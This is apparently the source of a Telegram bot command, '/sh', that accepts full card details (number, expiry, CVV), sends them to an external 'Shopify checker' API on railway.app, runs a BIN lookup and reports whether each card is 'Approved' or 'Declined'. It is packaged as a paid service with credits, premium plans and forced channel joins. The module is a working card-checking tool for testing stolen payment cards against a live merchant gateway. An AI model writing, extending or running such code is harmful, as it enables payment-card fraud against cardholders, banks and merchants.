import aiohttp
import asyncio
import time
import re
from html import escape
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CommandHandler, ContextTypes
from config import get_bin_info, kb_result, OWNER_ID, FORCE_CHANNELS, SUPPORT_LINK

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API ENDPOINT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SH_API = "https://web-production-c8f0c.up.railway.app/shopify"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def get_user_data(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> dict:
    uid = str(user_id)
    if "user_data" not in context.bot_data:
        context.bot_data["user_data"] = {}
    if uid not in context.bot_data["user_data"]:
        context.bot_data["user_data"][uid] = {
            "name": "User", "credits": 150, "plan": "TRIAL",
            "expires": 0, "pre_premium_credits": 0,
        }
    return context.bot_data["user_data"][uid]

def is_user_premium(ud: dict) -> bool:
    raw_plan = ud.get("plan", "TRIAL").upper()
    if raw_plan == "TRIAL":
        return False
    if ud.get("expires", 0) <= time.time():
        ud["plan"] = "TRIAL"
        ud["credits"] = ud.get("pre_premium_credits", 150)
        ud["expires"] = 0
        return False
    return True

def get_styled_plan(raw_plan: str) -> str:
    p = raw_plan.upper()
    if p == "CORE":  return "✨ Cᴏʀᴇ ✨"
    if p == "ELITE": return "⭐ Eʟɪᴛᴇ ⭐"
    if p == "ROOT":  return "👑 Rᴏᴏᴛ 👑"
    return "Tʀɪᴀʟ"

async def _check_force_sub(user_id: int, context) -> list:
    if user_id == OWNER_ID:
        return []
    not_joined = []
    for name, link in FORCE_CHANNELS:
        try:
            member = await context.bot.get_chat_member(f"@{name}", user_id)
            if member.status in ("left", "kicked"):
                not_joined.append((name, link))
        except Exception:
            pass
    return not_joined

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API CALL
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def call_sh_api(card_str: str) -> dict:
    """
    Call the Shopify checker API.
    Returns dict with keys: Status (bool), Response (str),
    Gateway (str), Price (float), Time (str)
    """
    params = {"cc": card_str, "site": "", "proxy": ""}
    timeout = aiohttp.ClientTimeout(total=90)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        async with session.get(SH_API, params=params) as resp:
            return await resp.json(content_type=None)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /sh COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # Maintenance check
    if context.bot_data.get("maintenance") and user.id != OWNER_ID:
        await update.message.reply_text(
            "⚠️ Bot is under maintenance. Try again later."
        )
        return

    # Gate toggle check
    if not context.bot_data.get("sh_on", True):
        await update.message.reply_text(
            "⚠️ Sʜᴏᴘɪꜰʏ gate is currently <b>OFF</b>.", parse_mode="HTML"
        )
        return

    # Force-sub check
    not_joined = await _check_force_sub(user.id, context)
    if not_joined:
        rows = [[InlineKeyboardButton(f"➺ Join @{n}", url=l)] for n, l in not_joined]
        rows.append([InlineKeyboardButton("✅ I Joined — Verify Now", callback_data="check_sub")])
        await update.message.reply_text(
            "<b>[ 𖥷iТ ] ➺ Jᴏɪɴ Rᴇǫᴜɪʀᴇᴅ</b>\n"
            "━━━━━━━━━━━━━━━━━\n"
            "Join our channel & group to use this bot.\n"
            "━━━━━━━━━━━━━━━━━",
            reply_markup=InlineKeyboardMarkup(rows),
            parse_mode="HTML",
        )
        return

    # ── Parse card ───────────────────────────────────────────
    card_str = None
    if context.args:
        card_str = context.args[0].strip()
    elif update.message.reply_to_message:
        replied_text = (
            update.message.reply_to_message.text
            or update.message.reply_to_message.caption
            or ""
        )
        m = re.search(
            r"(\d{13,19})\s*[|,;\s]\s*(\d{1,2})\s*[|,;\s]\s*(\d{2,4})\s*[|,;\s]\s*(\d{3,4})",
            replied_text,
        )
        if m:
            card_str = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"

    if not card_str:
        await update.message.reply_text(
            "⚠️ <b>Uꜱᴀɢᴇ:</b>\n<code>/sh cc|mm|yy|cvv</code>\n\n"
            "<b>Example:</b>\n<code>/sh 4111111111111111|12|26|123</code>",
            parse_mode="HTML",
        )
        return

    parts = card_str.split("|")
    if len(parts) != 4:
        await update.message.reply_text("❌ Invalid format. Use: <code>cc|mm|yy|cvv</code>", parse_mode="HTML")
        return

    cc_num, mm, yy, cvv = [p.strip() for p in parts]
    if len(yy) == 4:
        yy = yy[-2:]
    card_str = f"{cc_num}|{mm}|{yy}|{cvv}"

    # ── Credits check ─────────────────────────────────────────
    ud      = get_user_data(user.id, context)
    premium = is_user_premium(ud)

    if not premium:
        if ud.get("credits", 0) <= 0:
            await update.message.reply_text(
                "<b>[ 𖥷iТ ] ➺ Nᴏ Cʀᴇᴅɪᴛꜱ ❌</b>\n"
                "━━━━━━━━━━━━━━━━━\n"
                "You have no credits left.\n"
                "Redeem a code with /rm or buy a plan.\n"
                "━━━━━━━━━━━━━━━━━",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("💎 BUY PREMIUM", callback_data="mprice")],
                    [InlineKeyboardButton("📞 Support", url=SUPPORT_LINK)],
                ]),
            )
            return
        ud["credits"] -= 1

    # ── Processing message ────────────────────────────────────
    msg = await update.message.reply_text(
        "⏳ <b>Processing...</b>\n"
        "━━━━━━━━━━━━━━━━━\n"
        f"<b>Card</b> ➳ <code>{escape(card_str)}</code>\n"
        "<b>Gate</b> ➳ Shopify 🛒\n"
        "━━━━━━━━━━━━━━━━━",
        parse_mode="HTML",
    )

    start = time.time()
    bin_num = cc_num[:6]

    try:
        # ── Call API & BIN lookup in parallel ─────────────────
        api_result, bin_data = await asyncio.gather(
            call_sh_api(card_str),
            get_bin_info(bin_num),
            return_exceptions=True,
        )

        # Handle API errors
        if isinstance(api_result, Exception):
            raise api_result

        # ── Parse response ────────────────────────────────────
        approved   = bool(api_result.get("Status", False))
        raw_resp   = str(api_result.get("Response", "Unknown"))
        gateway    = str(api_result.get("Gateway", "Shopify Payments"))
        price      = api_result.get("Price", "N/A")
        api_time   = str(api_result.get("Time", f"{time.time()-start:.2f}s"))

        # Approve if response text contains "Approved" (case-insensitive)
        if "approved" in raw_resp.lower():
            approved = True

        status_ui = "Aᴘᴘʀᴏᴠᴇᴅ ✅" if approved else "Dᴇᴄʟɪɴᴇᴅ ❌"

        # ── BIN info ──────────────────────────────────────────
        bin_txt = country = flag = "N/A"
        if isinstance(bin_data, dict) and not bin_data.get("error"):
            s       = str(bin_data.get("scheme",  "N/A")).upper()
            t       = str(bin_data.get("type",    "N/A")).upper()
            b       = str(bin_data.get("bank",    "N/A"))
            country = str(bin_data.get("country", "N/A")).upper()
            flag    = bin_data.get("country_emoji", "")
            bin_txt = f"{s} - {t} - {b}"

        plan_ui  = get_styled_plan(ud.get("plan", "TRIAL"))
        username = escape(user.first_name or "User")

        # ── Final result message ──────────────────────────────
        text = (
            f"<b>[ 𖥷iТ ] ➺ {status_ui}</b>\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"<b>Status</b>   ➳ <b>{status_ui}</b>\n"
            f"<b>Card</b>     ➳ <code>{escape(card_str)}</code>\n"
            f"<b>Response</b> ➳ {escape(raw_resp)}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"<b>Gate</b>     ➳ {escape(gateway)} 🛒\n"
            f"<b>Price</b>    ➳ ${price}\n"
            f"<b>Time</b>     ➳ {escape(api_time)}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"<b>BIN</b>      ➳ {escape(bin_txt)}\n"
            f"<b>Country</b>  ➳ {flag} {escape(country)}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"<b>User</b>     ➳ {username} ({plan_ui})\n"
            f"📢 @Batcardchk"
        )
        await msg.edit_text(text, parse_mode="HTML", disable_web_page_preview=True,
                            reply_markup=kb_result(premium))

    except asyncio.TimeoutError:
        if not premium:
            ud["credits"] = ud.get("credits", 0) + 1
        await msg.edit_text(
            "<b>[ 𖥷iТ ] ➺ Tɪᴍᴇᴏᴜᴛ ❌</b>\n"
            "━━━━━━━━━━━━━━━━━\n"
            "API took too long. Try again.\n"
            "━━━━━━━━━━━━━━━━━",
            parse_mode="HTML",
        )
    except Exception as e:
        if not premium:
            ud["credits"] = ud.get("credits", 0) + 1
        await msg.edit_text(
            f"<b>[ 𖥷iТ ] ➺ Eʀʀᴏʀ ❌</b>\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"<code>{escape(str(e)[:150])}</code>\n"
            f"━━━━━━━━━━━━━━━━━",
            parse_mode="HTML",
        )


def get_sh_handler():
    return CommandHandler("sh", cmd_sh)
